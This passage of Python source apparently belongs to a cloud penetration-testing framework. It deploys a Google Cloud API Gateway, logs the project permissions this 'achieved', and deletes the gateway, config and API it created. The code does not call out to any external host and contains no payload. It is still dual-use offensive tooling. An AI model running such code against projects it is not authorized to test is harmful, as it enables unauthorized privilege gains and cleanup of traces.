            created_gateway = True
            print(f"{UtilityTools.GREEN}    Deployed: {gw_url}{UtilityTools.RESET}")
        except Exception as e:
            print(f"{UtilityTools.RED}    Error: {e}{UtilityTools.RESET}")
            configs_r.delete(name=config_resource)
            if created_api and api_resource:
                apis_r.delete(name=api_resource)
            return None

    if achieved_perms:
        ad: dict = {}
        ad.setdefault("project_permissions", {}).setdefault(project_id, set()).update(achieved_perms)
        session.insert_actions(ad, project_id)

    return {
        "api_resource": api_resource,
        "config_resource": config_resource,
        "gw_resource": gw_resource,
        "gw_url": gw_url,
        "api_id": api_id,
        "achieved_perms": achieved_perms,
        "created_api": created_api,
        "created_gateway": created_gateway,
    }


def cleanup_apigateway_resources(session, result: dict, *, delay: int = 0) -> None:
    """Delete gateway/config/API that were CREATED (not reused) during deploy."""
    import time as _time
    if delay > 0:
        print(f"\n{UtilityTools.YELLOW}[*] Waiting {delay}s before cleanup...{UtilityTools.RESET}")
        _time.sleep(delay)
    print(f"\n{UtilityTools.YELLOW}[*] Cleaning up created resources...{UtilityTools.RESET}")
    gws_r  = ApiGatewayGatewaysResource(session)
    cfg_r  = ApiGatewayConfigsResource(session)
    apis_r = ApiGatewayApisResource(session)
    if result.get("created_gateway") and result.get("gw_resource"):
        gws_r.delete(name=result["gw_resource"])
        print("    Deleted gateway")
    if result.get("config_resource"):
        cfg_r.delete(name=result["config_resource"])
        print("    Deleted config")
    if result.get("created_api") and result.get("api_resource"):
        apis_r.delete(name=result["api_resource"])
        print("    Deleted API")
